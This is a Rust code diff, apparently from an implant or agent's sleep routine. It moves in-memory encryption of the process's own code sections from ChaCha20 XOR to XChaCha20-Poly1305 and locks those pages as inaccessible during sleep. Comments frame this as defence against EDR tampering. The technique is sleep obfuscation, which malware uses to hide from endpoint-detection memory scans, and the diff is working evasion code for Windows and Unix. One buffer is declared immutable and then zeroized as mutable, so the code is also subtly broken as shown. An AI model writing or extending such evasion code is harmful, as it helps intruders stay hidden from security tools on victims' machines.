@@ -289,27 +289,39 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
 }
 
 pub mod crypto {
-    use chacha20::ChaCha20;
-    use chacha20::cipher::{KeyIvInit, StreamCipher};
+    use chacha20poly1305::{
+        aead::{Aead, KeyInit, OsRng},
+        XChaCha20Poly1305, XNonce,
+    };
     use rand::RngCore;
 
-    /// A section whose bytes have been XOR-encrypted in-place with a ChaCha20
-    /// keystream.  The `nonce` is the only per-section state needed to decrypt;
-    /// the 32-byte session key lives on the separate key page.
+    /// XChaCha20 nonce length (24 bytes).
+    const AEAD_NONCE_LEN: usize = 24;
+    /// Poly1305 authentication tag length (16 bytes).
+    const AEAD_TAG_LEN: usize = 16;
+
+    /// A section whose bytes have been AEAD-encrypted in-place with
+    /// XChaCha20-Poly1305.  The ciphertext (same size as plaintext) is written
+    /// back to the section; the 16-byte Poly1305 tag and 24-byte nonce are
+    /// stored separately so they survive the sleep period in a locked heap
+    /// buffer.  Tag verification on wake detects any EDR tampering.
     struct EncryptedSection {
         addr: *mut u8,
         size: usize,
         /// Windows: PAGE_* constant. Unix: libc::PROT_* flags stored as u32.
         orig_prot: u32,
-        /// Per-section ChaCha20 nonce (12 bytes).
-        nonce: [u8; 12],
+        /// Per-section XChaCha20 nonce (24 bytes).
+        nonce: [u8; AEAD_NONCE_LEN],
+        /// Poly1305 authentication tag (16 bytes).
+        tag: [u8; AEAD_TAG_LEN],
     }
 
-    // P2-05: Zeroize the nonce on drop to prevent lingering key material.
+    // P2-05: Zeroize the nonce and tag on drop to prevent lingering key material.
     impl Drop for EncryptedSection {
         fn drop(&mut self) {
             use zeroize::Zeroize;
             self.nonce.zeroize();
+            self.tag.zeroize();
         }
     }
 
@@ -666,9 +678,9 @@ pub mod crypto {
                 return;
             }
 
-            // Generate a 32-byte random key and write it to the key page.
+            // Generate a 32-byte random key using OsRng and write to the key page.
             let mut key = [0u8; 32];
-            rand::thread_rng().fill_bytes(&mut key);
+            OsRng.fill_bytes(&mut key);
             std::ptr::copy_nonoverlapping(key.as_ptr(), kp, 32);
             std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
 
@@ -684,37 +696,57 @@ pub mod crypto {
                     continue;
                 }
 
-                // Generate a fresh per-section nonce.
-                let mut nonce_bytes = [0u8; 12];
-                rand::thread_rng().fill_bytes(&mut nonce_bytes);
+                // Generate a fresh per-section 24-byte XChaCha20 nonce via OsRng.
+                let mut nonce_bytes = [0u8; AEAD_NONCE_LEN];
+                OsRng.fill_bytes(&mut nonce_bytes);
 
-                // Read key from the key page, XOR the section in-place.
+                // Read key from the key page, encrypt with XChaCha20-Poly1305.
                 let mut key_copy = [0u8; 32];
                 std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
-                {
-                    let mut cipher = ChaCha20::new(
-                        chacha20::Key::from_slice(&key_copy),
-                        chacha20::Nonce::from_slice(&nonce_bytes),
+                let tag = {
+                    let cipher = XChaCha20Poly1305::new_from_slice(&key_copy)
+                        .expect("key length is 32 bytes");
+                    let nonce = XNonce::from_slice(&nonce_bytes);
+                    let plaintext = std::slice::from_raw_parts(addr, size);
+                    // AEAD encrypt produces ciphertext + 16-byte tag.
+                    let ct_and_tag = cipher.encrypt(nonce, plaintext)
+                        .expect("XChaCha20-Poly1305 encryption failed");
+                    // Copy ciphertext (without tag) back to the section in-place.
+                    std::ptr::copy_nonoverlapping(
+                        ct_and_tag.as_ptr(),
+                        addr,
+                        size,
                     );
-                    cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
-                }
+                    // Extract the 16-byte Poly1305 tag from the tail.
+                    let mut tag = [0u8; AEAD_TAG_LEN];
+                    tag.copy_from_slice(&ct_and_tag[size..]);
+                    // Zero the temporary AEAD output.
+                    zeroize::Zeroize::zeroize(&mut ct_and_tag);
+                    tag
+                };
                 std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
 
                 // Lock the section down to NOACCESS.
                 let mut temp = 0u32;
                 if !protect_region(addr, size, PAGE_NOACCESS, &mut temp) {
-                    // Could not lock — undo the XOR so the section is sane again.
+                    // Could not lock — decrypt the section so it is sane again.
                     if protect_region(addr, size, old_protect, &mut temp) {
                         let mut key_copy2 = [0u8; 32];
                         std::ptr::copy_nonoverlapping(kp, key_copy2.as_mut_ptr(), 32);
-                        let mut cipher2 = ChaCha20::new(
-                            chacha20::Key::from_slice(&key_copy2),
-                            chacha20::Nonce::from_slice(&nonce_bytes),
-                        );
-                        cipher2.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
+                        let cipher2 = XChaCha20Poly1305::new_from_slice(&key_copy2)
+                            .expect("key length is 32 bytes");
+                        let nonce2 = XNonce::from_slice(&nonce_bytes);
+                        // Reassemble ciphertext + tag for decryption.
+                        let mut ct_and_tag2 = Vec::with_capacity(size + AEAD_TAG_LEN);
+                        std::ptr::copy_nonoverlapping(addr, ct_and_tag2.as_mut_ptr(), size);
+                        ct_and_tag2.set_len(size);
+                        ct_and_tag2.extend_from_slice(&tag);
+                        if let Ok(pt) = cipher2.decrypt(nonce2, ct_and_tag2.as_slice()) {
+                            std::ptr::copy_nonoverlapping(pt.as_ptr(), addr, size);
+                        }
                         std::ptr::write_volatile(&mut key_copy2 as *mut _, [0u8; 32]);
                     }
-                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
+                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; AEAD_NONCE_LEN]);
                     continue;
                 }
 
@@ -724,9 +756,10 @@ pub mod crypto {
                         size,
                         orig_prot: old_protect,
                         nonce: nonce_bytes,
+                        tag,
                     });
                 });
-                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
+                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; AEAD_NONCE_LEN]);
                 encrypted_count += 1;
             }
 
@@ -766,22 +799,50 @@ pub mod crypto {
 
                 let mut rw_prev = 0u32;
                 if !protect_region(section.addr, section.size, PAGE_READWRITE, &mut rw_prev) {
-                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
+                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);
                     continue;
                 }
 
-                // XOR the section again with the same key+nonce to decrypt in-place.
+                // Reassemble ciphertext + tag, then AEAD-decrypt with tag verification.
                 let mut key_copy = [0u8; 32];
                 std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                 {
-                    let mut cipher = ChaCha20::new(
-                        chacha20::Key::from_slice(&key_copy),
-                        chacha20::Nonce::from_slice(&section.nonce),
+                    let cipher = XChaCha20Poly1305::new_from_slice(&key_copy)
+                        .expect("key length is 32 bytes");
+                    let nonce = XNonce::from_slice(&section.nonce);
+                    // Build the ciphertext || tag buffer expected by the AEAD.
+                    let mut ct_and_tag = Vec::with_capacity(section.size + AEAD_TAG_LEN);
+                    std::ptr::copy_nonoverlapping(
+                        section.addr,
+                        ct_and_tag.as_mut_ptr(),
+                        section.size,
                     );
-                    cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.size));
+                    ct_and_tag.set_len(section.size);
+                    ct_and_tag.extend_from_slice(&section.tag);
+
+                    match cipher.decrypt(nonce, ct_and_tag.as_slice()) {
+                        Ok(plaintext) => {
+                            std::ptr::copy_nonoverlapping(
+                                plaintext.as_ptr(),
+                                section.addr,
+                                section.size,
+                            );
+                        }
+                        Err(_) => {
+                            // Poly1305 tag verification FAILED — the encrypted
+                            // section was tampered with during sleep.  Executing
+                            // tampered code is unacceptable; terminate immediately.
+                            log::error!(
+                                "decrypt_sections: Poly1305 tag verification FAILED for section at {:p} \
+                                 — possible EDR tampering detected. Terminating process.",
+                                section.addr,
+                            );
+                            std::process::abort();
+                        }
+                    }
                 }
                 std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
-                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
+                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);
 
                 let mut restore_prev = 0u32;
                 let _ = protect_region(section.addr, section.size, section.orig_prot, &mut restore_prev);
@@ -804,16 +865,16 @@ pub mod crypto {
 
             // Allocate a private anonymous page to hold the session key.
             // This page is not part of any executable section and will not be
-            // included in the XOR pass.
+            // included in the encryption pass.
             let (kp, kplen) = alloc_key_page();
             if kp.is_null() {
                 log::error!("encrypt_sections: failed to allocate key page — aborting");
                 return;
             }
 
-            // Generate random 32-byte key and write to key page.
+            // Generate random 32-byte key using OsRng and write to key page.
             let mut key = [0u8; 32];
-            rand::thread_rng().fill_bytes(&mut key);
+            OsRng.fill_bytes(&mut key);
             std::ptr::copy_nonoverlapping(key.as_ptr(), kp, 32);
             std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
 
@@ -824,41 +885,61 @@ pub mod crypto {
             for (addr, size, orig_prot) in get_code_sections() {
                 if addr.is_null() || size == 0 { continue; }
 
-                // Make region writable so we can XOR it in-place.
+                // Make region writable so we can encrypt it in-place.
                 if !protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
                     continue;
                 }
 
-                // Generate a fresh per-section nonce.
-                let mut nonce_bytes = [0u8; 12];
-                rand::thread_rng().fill_bytes(&mut nonce_bytes);
+                // Generate a fresh per-section 24-byte XChaCha20 nonce via OsRng.
+                let mut nonce_bytes = [0u8; AEAD_NONCE_LEN];
+                OsRng.fill_bytes(&mut nonce_bytes);
 
-                // Read key from the key page, XOR the section in-place.
+                // Read key from the key page, encrypt with XChaCha20-Poly1305.
                 let mut key_copy = [0u8; 32];
                 std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
-                {
-                    let mut cipher = ChaCha20::new(
-                        chacha20::Key::from_slice(&key_copy),
-                        chacha20::Nonce::from_slice(&nonce_bytes),
+                let tag = {
+                    let cipher = XChaCha20Poly1305::new_from_slice(&key_copy)
+                        .expect("key length is 32 bytes");
+                    let nonce = XNonce::from_slice(&nonce_bytes);
+                    let plaintext = std::slice::from_raw_parts(addr, size);
+                    // AEAD encrypt produces ciphertext + 16-byte tag.
+                    let ct_and_tag = cipher.encrypt(nonce, plaintext)
+                        .expect("XChaCha20-Poly1305 encryption failed");
+                    // Copy ciphertext (without tag) back to the section in-place.
+                    std::ptr::copy_nonoverlapping(
+                        ct_and_tag.as_ptr(),
+                        addr,
+                        size,
                     );
-                    cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
-                }
+                    // Extract the 16-byte Poly1305 tag from the tail.
+                    let mut tag = [0u8; AEAD_TAG_LEN];
+                    tag.copy_from_slice(&ct_and_tag[size..]);
+                    // Zero the temporary AEAD output.
+                    zeroize::Zeroize::zeroize(&mut ct_and_tag);
+                    tag
+                };
                 std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
 
                 // Lock the section to PROT_NONE.
                 if !protect_region(addr, size, libc::PROT_NONE) {
-                    // Could not lock — undo XOR so the section stays consistent.
+                    // Could not lock — decrypt the section so it stays consistent.
                     if protect_region(addr, size, orig_prot) {
                         let mut key_copy2 = [0u8; 32];
                         std::ptr::copy_nonoverlapping(kp, key_copy2.as_mut_ptr(), 32);
-                        let mut cipher2 = ChaCha20::new(
-                            chacha20::Key::from_slice(&key_copy2),
-                            chacha20::Nonce::from_slice(&nonce_bytes),
-                        );
-                        cipher2.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
+                        let cipher2 = XChaCha20Poly1305::new_from_slice(&key_copy2)
+                            .expect("key length is 32 bytes");
+                        let nonce2 = XNonce::from_slice(&nonce_bytes);
+                        // Reassemble ciphertext + tag for decryption.
+                        let mut ct_and_tag2 = Vec::with_capacity(size + AEAD_TAG_LEN);
+                        std::ptr::copy_nonoverlapping(addr, ct_and_tag2.as_mut_ptr(), size);
+                        ct_and_tag2.set_len(size);
+                        ct_and_tag2.extend_from_slice(&tag);
+                        if let Ok(pt) = cipher2.decrypt(nonce2, ct_and_tag2.as_slice()) {
+                            std::ptr::copy_nonoverlapping(pt.as_ptr(), addr, size);
+                        }
                         std::ptr::write_volatile(&mut key_copy2 as *mut _, [0u8; 32]);
                     }
-                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
+                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; AEAD_NONCE_LEN]);
                     continue;
                 }
 
@@ -868,9 +949,10 @@ pub mod crypto {
                         size,
                         orig_prot: orig_prot as u32,
                         nonce: nonce_bytes,
+                        tag,
                     });
                 });
-                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
+                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; AEAD_NONCE_LEN]);
                 encrypted_count += 1;
             }
 
@@ -901,22 +983,50 @@ pub mod crypto {
                 if section.addr.is_null() || section.size == 0 { continue; }
 
                 if !protect_region(section.addr, section.size, libc::PROT_READ | libc::PROT_WRITE) {
-                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
+                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);
                     continue;
                 }
 
-                // XOR the section again with the same key+nonce to recover plaintext.
+                // Reassemble ciphertext + tag, then AEAD-decrypt with tag verification.
                 let mut key_copy = [0u8; 32];
                 std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                 {
-                    let mut cipher = ChaCha20::new(
-                        chacha20::Key::from_slice(&key_copy),
-                        chacha20::Nonce::from_slice(&section.nonce),
+                    let cipher = XChaCha20Poly1305::new_from_slice(&key_copy)
+                        .expect("key length is 32 bytes");
+                    let nonce = XNonce::from_slice(&section.nonce);
+                    // Build the ciphertext || tag buffer expected by the AEAD.
+                    let mut ct_and_tag = Vec::with_capacity(section.size + AEAD_TAG_LEN);
+                    std::ptr::copy_nonoverlapping(
+                        section.addr,
+                        ct_and_tag.as_mut_ptr(),
+                        section.size,
                     );
-                    cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.size));
+                    ct_and_tag.set_len(section.size);
+                    ct_and_tag.extend_from_slice(&section.tag);
+
+                    match cipher.decrypt(nonce, ct_and_tag.as_slice()) {
+                        Ok(plaintext) => {
+                            std::ptr::copy_nonoverlapping(
+                                plaintext.as_ptr(),
+                                section.addr,
+                                section.size,
+                            );
+                        }
+                        Err(_) => {
+                            // Poly1305 tag verification FAILED — the encrypted
+                            // section was tampered with during sleep.  Executing
+                            // tampered code is unacceptable; terminate immediately.
+                            log::error!(
+                                "decrypt_sections: Poly1305 tag verification FAILED for section at {:p} \
+                                 — possible EDR tampering detected. Terminating process.",
+                                section.addr,
+                            );
+                            std::process::abort();
+                        }
+                    }
                 }
                 std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
-                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
+                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);
 
                 // Restore the original page protection.
                 let _ = protect_region(section.addr, section.size, section.orig_prot as i32);
